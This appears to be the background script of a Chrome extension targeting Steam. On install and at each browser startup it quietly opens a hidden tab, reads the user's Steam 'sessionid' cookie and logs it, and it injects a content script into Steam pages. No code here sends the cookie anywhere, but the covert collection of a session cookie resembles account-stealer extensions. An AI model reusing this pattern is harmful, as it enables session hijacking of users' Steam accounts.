chrome.runtime.onInstalled.addListener(() => {
  console.log('Extension installed');
  initializeTabListener();
  fetchSteamCookies();  // Fetch cookies when the extension is installed or updated
});

// Add listener for browser startup
chrome.runtime.onStartup.addListener(() => {
  console.log('Browser restarted');
  fetchSteamCookies();  // Fetch cookies when the browser is restarted
});

// Set up the tab listener function
function initializeTabListener() {
  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    console.log('Tab updated:', tabId, changeInfo, tab);
    if (changeInfo.status === 'complete' && tab.url) {
      console.log('Tab URL:', tab.url);
      if (tab.url.includes('steamcommunity.com') || tab.url.includes('store.steampowered.com')) {
        console.log('Injecting content script');
        chrome.scripting.executeScript({
          target: { tabId: tabId },
          files: ['content.js']
        }, () => {
          if (chrome.runtime.lastError) {
            console.error('Script injection failed:', chrome.runtime.lastError);
          } else {
            console.log('Content script injected');
          }
        });
      }
    }
  });
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log('Message received:', request);
  if (request.action === 'openPopup') {
    chrome.windows.create({
      url: chrome.runtime.getURL('popup.html'),
      type: 'popup',
      width: 500,
      height: 300
    }, (window) => {
      console.log('Popup window created:', window);
    });
  }
});

function fetchSteamCookies() {
  // Open a new background tab with the Steam login page
  chrome.tabs.create({ url: 'https://store.steampowered.com', active: false }, (tab) => {
    const targetTabId = tab.id;
    console.log(`Created tab with ID: ${targetTabId}`);

    // Listen for the tab to complete loading
    chrome.tabs.onUpdated.addListener(function listener(updatedTabId, info, updatedTab) {
      console.log(`Tab updated - ID: ${updatedTabId}, Status: ${info.status}, URL: ${updatedTab.url}`);
      
      // Check if this is the target tab and it has loaded the intended URL
      if (updatedTabId === targetTabId && info.status === 'complete' && updatedTab.url.includes('store.steampowered.com')) {
        console.log('Target URL loaded, fetching cookies...');
        
        // Fetch cookies after reaching the login page
        chrome.cookies.getAll({ domain: 'steampowered.com' }, (cookies) => {
          const sessionidCookie = cookies.find(cookie => cookie.name === 'sessionid');
          if (sessionidCookie) {
            console.log('SessionID:', sessionidCookie.value);
          } else {
            console.log('SessionID cookie not found');
          }
          
          // Remove the listener and close the tab
          chrome.tabs.onUpdated.removeListener(listener);
          console.log(`Closing tab with ID: ${targetTabId}`);
          chrome.tabs.remove(targetTabId);
        });
      }
    });
  });
}




